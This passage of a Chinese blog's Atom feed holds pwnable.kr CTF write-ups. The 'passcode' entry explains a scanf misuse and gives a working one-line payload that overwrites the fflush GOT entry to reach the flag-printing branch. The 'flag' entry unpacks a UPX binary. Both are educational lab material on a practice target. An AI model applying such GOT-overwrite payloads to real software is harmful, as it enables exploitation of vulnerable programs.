1ab099ecf362c9da287711e98a7fe34f82202086cc9773a9b1f2ae790408a86fb22a97ecbb347e2cdf1ff8472d3b64760ecac5c8d660174d44da8bbaee6839dfec4dadb66c493d9ba026fdab8b4c86d5bcea23dca2c424e9069eb6ac8db2a4c8f84c54cfb7890b645d83192b943115df0e48812e367d26e816b9da170861eea8acb1483b8be528a1287cc536e3715b1f359ee893a22e7102f616d86c030bfc572135db03e78236084108aa55d7b7797deb2ceaf4be438f68d4404b2e7243c6fb33f9694a2aefdc51bde27e542032ad4995b67cd4e9b308446e8cfaed9866cab85f021daa6a24a79394a7e7818b4c74489a61e2bec95c04c11a7aed63a3502a75e92040c53286d361f4d6ba20508cae4fcd789f3e5ab92ab90812f25653ac4aa6c38b1d8096d0d42988b2e207d6b81b3c60c07df988a8f3f694e42b0095c00c427117f48fe74b9a8ccb6a81b44caa622a798d6349a1b024fe1e7ea631660ba64ca45fd56eb6fe4d048f5969150022fe96f0007c43a03970203192b0e3535cf53bf24531320725a5819248fff56b867508fe9e061af62f878b0225ef88963b8ec67c6b12f2e0beb2f638d03a9a4bfbec141d7b0dd40563b51aeec6356fe27d1ef5b108c0a2d98510a0cfba032aa0b9ba50efd4415c80e7bad33509c47cf286d696cd32794eab0498072593da688613a9ff5018d2b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（五）[passcode]</title>
    <link href="https://muzibing.github.io/2020/05/15/2020.05.05%EF%BC%88117%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/15/2020.05.05（117）/</id>
    <published>2020-05-14T16:00:00.000Z</published>
    <updated>2020-05-16T01:23:30.868Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="navy">一、基础知识</font></h3><h4 id="1-mov-eax-gs-0x14指令的作用"><a href="#1-mov-eax-gs-0x14指令的作用" class="headerlink" title="1.mov    eax,gs:0x14指令的作用"></a><font color="blue">1.<code>mov    eax,gs:0x14</code>指令的作用</font></h4><blockquote><p>gcc编译器专门为防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。</p></blockquote><p>简单来说就是，<code>从gs:0x14的地方取出来，然后在函数返回之前对比栈中的这个随机值和gs:0x14来断定是否发生栈溢出</code>。    </p><h4 id="2-lea和mov指令的区别"><a href="#2-lea和mov指令的区别" class="headerlink" title="2.lea和mov指令的区别"></a><font color="blue">2.<code>lea</code>和<code>mov</code>指令的区别</font></h4><p>◫ <code>lea</code>：将<code>源操作数的地址</code>传到目的操作数中</p><p>◫ <code>mov</code>：将<code>数据从源操作数</code>传到目的操作数中</p><p>例如：The address of ebx is <code>0xffe1c1e8</code> and data is <code>0xf7fadd20</code> in  <code>0xffe1c178</code>(<code>0xffe1c1e8-0x70</code>). </p><p>⇱ <code>lea edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>的地址  <code>0xffe1c178</code>传到<code>edx</code>寄存器中</p><p>⇱ <code>mov edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>地址中的数据<code>0xf7fadd20</code>传到<code>edx</code>寄存器中</p><p><img src="/images/117-1.png" alt></p><h4 id="3-scanf的原理"><a href="#3-scanf的原理" class="headerlink" title="3.scanf的原理"></a><font color="blue">3.<code>scanf</code>的原理</font></h4><p>需要注意的是：</p><blockquote><ol><li>用户输入的字符，会以<code>ASCII码形式</code>存储在键盘缓冲区；</li><li>每调用一次scanf函数，就从<font color="navy">键盘缓冲区读走一个字符，相当于清除缓冲区</font>；</li><li>若用户一次输入n个字符，则前n次调用scanf函数都不需要用户再次输入，直到把缓冲区的数据全部读取(清除)干净；</li><li>scanf取地址<code>&amp;</code>符号的作用：是将从键盘缓冲区读取的字符放到<code>&amp;var</code>地址中，其中字符串无需&amp;，因为字符串本身就代表地址的开始；</li><li>调用scanf()函数时，用户最后输入的回车也会储存在键盘缓冲区；(见如下程序)</li></ol></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序在VC++6.0中的显示结果是：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">49</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><blockquote><p>下面以一个例子做个简单介绍：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(ch)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case1\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case2\n"</span>);</span><br><span class="line">                <span class="comment">// fflush(stdin);    //清除缓冲区</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case3\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1235</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">case2</span></span><br><span class="line"><span class="comment">case3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对于第二个输入1，为什么不会继续循环呢？</p><blockquote><p>因为当输入“1”后，相当于输入了“1”和“回车”，键盘缓冲区将保存它们的ASCII码：49 10，但是因为scanf(“%c”,&amp;a);语句将把ASCII码49送入a中，所以第一次执行完scanf(“%c”,&amp;a);语句后，键盘缓冲区中剩下的内容为：10，然后进入switch语句，因为现在a=’1’，所以执行case ‘1’分支，break后继续while循环，开始第二次执行scanf(“%c”,&amp;a);语句，但这次程序不会停下来等待输入，因为键盘缓冲区中还有剩余的ASCII码：10。因此第二次执行scanf(“%c”,&amp;a);语句时，程序直接将缓冲区中的ASCII码10送入a中，接着又进入switch语句，但是现在a=’CR’，所以转到default分支，执行return后退出循环和函数。</p></blockquote><h3 id="二、题目分析"><a href="#二、题目分析" class="headerlink" title="二、题目分析"></a><font color="navy">二、题目分析</font></h3><p>1.首先连上服务器看一下<code>passcode.c</code>文件：</p><p><img src="/images/117-2.png" alt></p><blockquote><p>从图中可以看出，<code>main</code>函数中先后调用了两个函数，即<code>welcome</code>和<code>login</code>函数：</p><ul><li>在<code>welcome</code>函数中，需要输入长度为100的<code>name</code>字符串；</li><li>在<code>login</code>函数中需要输入两个变量的值<code>passcode1</code>和<code>passcode2</code>，并且在输入<code>passcode1</code>后清除了<code>stdin</code>中的缓存，也就是防止在输入<code>passcode1</code>的时候，将值给<code>passcode1</code>。更为重要的一点是该函数中的两个<code>scanf</code>输入整数类型时，没有加<code>&amp;</code>符号，也就意味着<code>将passcode1和passcode2中的值当作地址，然后将键盘中的缓存输入这两个地址指向的内存中，</code>示意图如下：</li></ul></blockquote><p><img src="/images/117-3.png" alt></p><blockquote><ul><li>如果带有<code>&amp;</code>符号，正常的情况下如下图：</li></ul></blockquote><p><img src="/images/117-4.png" alt></p><p>2.<code>file passcode</code>查看一下ELF文件的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ file passcode</span><br><span class="line">passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可得可执行文件<code>passcode</code>是一个32位的ELF可执行文件</p></blockquote><p>3.<code>checksec passcode</code>查看一下该可执行文件开启了什么保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ checksec passcode</span><br><span class="line">[*] &apos;/home/passcode/passcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELROd</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>可得：</p><ul><li>对GOT表具有写的权限</li><li>开启了Cookie，也就是金丝雀保护</li><li>栈不可知性</li><li>没有内存开启地址随机化</li></ul></blockquote><p>4.如何才能执行<code>system</code>函数？</p><blockquote><ul><li>第一种方法就是使得<code>passcode1==338150 &amp;&amp; passcode2==13371337</code>，但是我们无法往passcode1和passcode2中再写入值，而是只能向这两个变量中的值所指向的内存地址写入值，那么这种方法❌</li><li>第二种方法就是通过变量<code>name</code>的输入实现栈溢出，但是passcode开启了金丝雀，所以无法实现栈溢出❌</li><li>第三种方法就是利用ret2libc技术✔</li></ul></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="navy">三、解题步骤</font></h3><p>1.<code>scp -P 2222 passcode@pwnable:home/passcode/passcode /tmp</code>将<code>passcode</code>从远程服务器上下载到本地，然后用gdb进行调试，寻找<code>name</code>、<code>passcode1</code>和<code>passcode2</code>的位置：</p><p><img src="/images/117-5.png" alt></p><blockquote><p>从上图可以看出<code>name</code>的起始地址为<code>ebp-0x70</code>，在本次调试中为<code>0xffd3bdc8</code></p></blockquote><p><img src="/images/117-6.png" alt></p><blockquote><p>从上图可以看出<code>passcode1</code>的起始地址为<code>ebp-0x10</code>，在本次调试中为<code>0xffd3be28</code>，而<code>0xffd3be28</code>中的值指向了<code>0xffd3be84</code>，<code>0xffd3be84</code>中的值为0</p></blockquote><p><img src="/images/117-7.png" alt></p><blockquote><p>从上图可以看出<code>passcode2</code>的起始地址为<code>ebp-0xc</code>，在本次调试中为<code>0xffd3be2c</code>，而<code>0xffd3be2c</code>中的值指向了<code>0x3b8fa100</code></p></blockquote><p>虽然都是<code>ebp-.</code>但是对于<code>welcome</code>和<code>login</code>函数中的<code>ebp</code>是否一样呢？我们看上面的三张图片：</p><ul><li>第一张是<code>welcome</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li><li>第二张是<code>login</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li></ul><p>所以可以得到如下的示意图：</p><p><img src="/images/117-8.png" alt></p><p>2.通过题目中的<code>passcode.c</code>源码以及gdb的调试结果可以得到，passcode1的位置处于name内存的最后四个字节，可以通过上面的示意图得出该结论，因此我们可以在输入<code>name</code>变量值的时候，将<code>passcode1</code>中的值进行修改，可以使得我们往特定的地址输入值，那么我们可以利用该思想进行绕过。我们看一下 system(“/bin/cat flag”);语句前面是printf(“Login OK!\n”);语句，我们是不是可以绕过if的判断条件，直接执行printf(“Login OK!\n”);语句或者system(“/bin/cat flag”);，在这里我们可以修改<code>fflush</code>函数的<strong>GOT表</strong>，要注意这里修改的是GOT表，因为<code>RELRO: Partial RELROd</code>说明GOT表具有可写的权力，具体的如下方的示意图：</p><p><img src="/images/117-9.png" alt></p><p>3.上图只是一个大概的过程，可知我们的构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514135&apos;+&apos;\n&apos;&quot;| ./passcode</span><br></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><blockquote><p>这里要注意的是：</p><ul><li>在修改<code>0x804a004</code>时要用小段进行书写，因为<code>Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</code>魔数的第6个字是<code>01</code>代表小段。</li><li>在输入<code>0x80485d7</code>时，因为要求是整数，所以要将<code>0x80485d7</code>变为<code>134514135</code></li></ul></blockquote><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="navy">四、参考文章</font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/47d484b9227e" target="_blank" rel="noopener">栈溢出攻击及防护方法简介</a></li><li><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></li><li><a href="https://github.com/JnuSimba/LinuxSecNotes/blob/master/Linux%20%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E7%9F%A5%E8%AF%86/Linux%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.md" target="_blank" rel="noopener">Linux 栈溢出保护机制</a></li><li><a href="https://zhuanlan.zhihu.com/p/33360460" target="_blank" rel="noopener">键盘缓冲区（scanf原理）</a></li><li><a href="https://www.cnblogs.com/qihuanye-229110/articles/11149715.html" target="_blank" rel="noopener">C语言scanf函数原理</a></li><li><a href="https://www.cnblogs.com/shuaishuaidefeizhu/p/5886899.html" target="_blank" rel="noopener">scanf()函数原理</a></li><li><a href="https://bbs.pediy.com/thread-247956.htm" target="_blank" rel="noopener">[原创]pwnable.kr passcode</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-mov-eax-gs-0x14指令的作用&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>《梦炬手册》五周年纪念版下载页</title>
    <link href="https://muzibing.github.io/2020/05/04/2020.05.04%EF%BC%88116%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/04/2020.05.04（116）/</id>
    <published>2020-05-03T16:00:00.000Z</published>
    <updated>2020-05-04T10:28:31.938Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/pdf/《梦炬手册》.pdf">点击下载文件</a></p><object data="/pdf/《梦炬手册》.pdf" type="application/pdf" width="100%" height="1000"></object>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;/pdf/《梦炬手册》.pdf&quot;&gt;点击下载文件&lt;/a&gt;&lt;/p&gt;
&lt;object data=&quot;/pdf/《梦炬手册》.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;1000&quot;&gt;


&lt;/object&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（四）[flag]</title>
    <link href="https://muzibing.github.io/2020/05/02/2020.05.02%EF%BC%88115%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/02/2020.05.02（115）/</id>
    <published>2020-05-01T16:00:00.000Z</published>
    <updated>2020-05-15T14:09:09.834Z</updated>
    
    <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=412935552&bvid=BV1FV411d7u7&cid=186570036&page=2" scrolling="no" border="0" frameborder="0" framespacing="0" allowfullscreen="true" width="100%" height="500"> </iframe><!--五四特别博客：内附何冰五四演讲视频《后浪》，致敬五四青年，奋发有为！--><h3 id="0x00-相关知识"><a href="#0x00-相关知识" class="headerlink" title="0x00 相关知识"></a><font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="1-UPX-加壳"><a href="#1-UPX-加壳" class="headerlink" title="1.UPX 加壳"></a><font color="blue"><code>1.UPX 加壳</code></font></h4><blockquote><p>这里就简单介绍一下UPX加壳的原理，详细内容以后会进行专题研究。</p></blockquote><p><img src="/images/115-1.png" alt></p><p>通过上图可以看出最重要的部分应该为<code>Compressed data</code>和<code>Stub</code>，下面简单的讲一下UPX加壳的原理以及加壳后如何执行程序。</p><p><code>UPX的工作原理如下</code>：首先将程序压缩， 所谓的压缩包括两方面：  </p><ul><li><p>一方面在程序的开头或者其他合适的地方插入一段代码</p></li><li><p>另一方面是将程序的其他地方做压缩（也就是上面讲到的压缩），压缩也可以叫做加密，因为压缩后的程序比较难看懂，原来的代码有很大的不同；</p></li></ul><p>当程序执行时：实时的对程序解压缩。解压缩功能是在<code>Stub</code>节区插入的代码完成的功能，联起来就是：upx可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。</p><p><img src="/images/115-2.png" alt></p><p>从上图可以看出在加壳后代码段的信息被压缩成<code>Compressed Data</code>节区，那么在运行时程序会根据<code>Stub</code>节区的内容将<code>Compressed Data</code>进行解压然后运行程序。</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@kali:~/Documents/CTF/PWN/pwnable.kr/flag# file flag </span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure><blockquote><p>查看文件信息，从得到的结果可以看出flag是一个64位ELF文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# checksec flag </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/pwnable.kr/flag/flag&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><blockquote><p>检查flag文件开启了什么保护，通过结果可以看出：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 对GOT表可写可读</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 没有开启金丝雀保护</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 栈可执行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 没有开启地址随机化</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 有可写可读可执行段</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ 进行UPX加壳</p><p>可以看出flag文件的大部分保护都没有开启，只是有了一个UPX加壳</p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# upx -d f1ag -o flag</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><blockquote><p>① 对flag文件进行脱壳，得到一个脱壳后的flag，其中文件由335288bits扩展成883745bits，格式是Linux环境下的amd64</p><p>② 然后用IDA-64打开脱壳后的flag文件，得到<code>main</code>函数伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will malloc() and strcpy the flag there. take it."</span>, argv, envp);</span><br><span class="line">  LODWORD(v3) = <span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  sub_400320(v3, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到<code>sub_400320</code>函数的第二个参数为flag，双击参数flag，得到我们想要的flag。</p></blockquote><p><img src="/images/115-3.png" alt></p><h3 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a><font color="navy"><code>0x03 参考文章</code></font></h3><ul><li><p><a href="https://bbs.pediy.com/thread-248779.htm" target="_blank" rel="noopener">upx原理分析</a></p></li><li><p><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">脱壳第三讲,UPX压缩壳,以及补充壳知识</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;//player.bilibili.com/player.html?aid=412935552&amp;bvid=BV1FV411d7u7&amp;cid=186570036&amp;page=2&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
</feed>
